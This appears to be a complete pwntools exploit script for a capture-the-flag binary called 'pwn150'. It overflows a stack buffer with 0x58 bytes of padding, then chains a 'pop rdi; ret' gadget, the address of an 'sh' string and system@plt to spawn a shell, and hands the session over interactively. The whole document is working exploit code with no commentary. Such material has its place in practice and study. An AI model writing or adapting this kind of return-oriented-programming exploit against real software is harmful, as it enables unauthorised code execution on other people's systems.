from pwn import *

p = process("./pwn150")

print p.recv()

popret = 0x4006c0
addesp_8 = 0x4005ae
sh = p64(0x4003ef)
pop_rdi_ret = p64(0x00400883)
fgets_plt = p64(0x0000000000400610)
system_plt = p64(0x00000000004005E0)

payload ="a"*(0x50+8)
payload+=pop_rdi_ret
payload+=sh
payload+=system_plt

p.sendline(payload)
p.interactive()
